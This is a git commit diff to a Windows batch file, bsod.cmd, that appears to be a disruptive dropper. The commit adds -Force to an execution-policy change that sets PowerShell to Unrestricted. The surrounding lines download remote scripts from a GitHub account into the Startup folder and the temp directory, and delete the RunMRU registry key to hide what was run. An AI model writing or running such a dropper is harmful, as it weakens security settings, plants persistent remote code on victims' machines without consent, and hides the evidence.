b895768e42fdad10e1621c0f12e50cb6422fd338
alext30Developer <72646375+alext30Developer@users.noreply.github.com>
2023-02-11 14:56:32 +0200

    Update bsod.cmd

--- BSOD/files/bsod.cmd
+++ BSOD/files/bsod.cmd
@@ -1,4 +1,4 @@
-powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup && powershell.exe iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/start.cmd -outfile start.cmd
 cd %temp% && powershell.exe iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/bsod.ps1 -outfile bsod.ps1
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
